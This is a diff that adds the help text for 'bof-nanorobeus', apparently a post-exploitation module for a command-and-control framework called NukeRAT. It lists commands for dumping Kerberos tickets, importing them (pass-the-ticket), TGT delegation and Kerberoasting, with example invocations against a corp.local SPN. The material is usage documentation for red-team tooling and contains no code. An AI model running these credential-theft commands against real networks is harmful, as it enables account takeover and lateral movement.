@@ -1,0 +1,30 @@
+ABOUT
+    Kerberos ticket management. Supports listing LUIDs, sessions, tickets,
+    dumping, importing (ptt), purging, TGT delegation, and Kerberoasting.
+USAGE:
+    bof-nanorobeus --- <command> [options]
+
+COMMANDS:
+    luid                              Get current logon ID
+    sessions [/luid:<hex> | /all]     List logon sessions
+    klist [/luid:<hex> | /all]        List Kerberos tickets
+    dump [/luid:<hex> | /all]         Dump Kerberos tickets (base64)
+    ptt /ticket:<BASE64> [/luid:<hex>] Import ticket into a logon session
+    purge [/luid:<hex>]               Purge Kerberos tickets
+    tgtdeleg /spn:<SPN>               Retrieve usable TGT for current user
+    kerberoast /spn:<SPN>             Perform Kerberoasting against SPN
+    help                              Print help
+
+EXAMPLES:
+    bof-nanorobeus --- luid
+    bof-nanorobeus --- klist
+    bof-nanorobeus --- dump /all
+    bof-nanorobeus --- ptt /ticket:BASE64...
+    bof-nanorobeus --- kerberoast /spn:MSSQLSvc/dc01.corp.local:1433
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    bof-nanorobeus -w 60 --- luid
